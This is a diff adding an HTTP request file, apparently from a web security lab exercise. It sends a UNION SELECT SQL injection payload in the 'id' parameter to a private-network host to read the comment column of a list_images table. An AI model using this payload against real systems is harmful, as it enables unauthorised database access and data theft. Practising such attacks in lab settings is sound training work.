@@ -1,0 +1,17 @@
+meta {
+  name: 01-SQL injection avancée
+  type: http
+  seq: 5
+}
+
+post {
+  url: http://192.168.1.16/?page=searchimg&id=1+UNION+SELECT+comment%2C+null+FROM+list_images%3B&Submit=Submit
+  body: none
+  auth: none
+}
+
+params:query {
+  page: searchimg
+  id: 1+UNION+SELECT+comment%2C+null+FROM+list_images%3B
+  Submit: Submit
+}
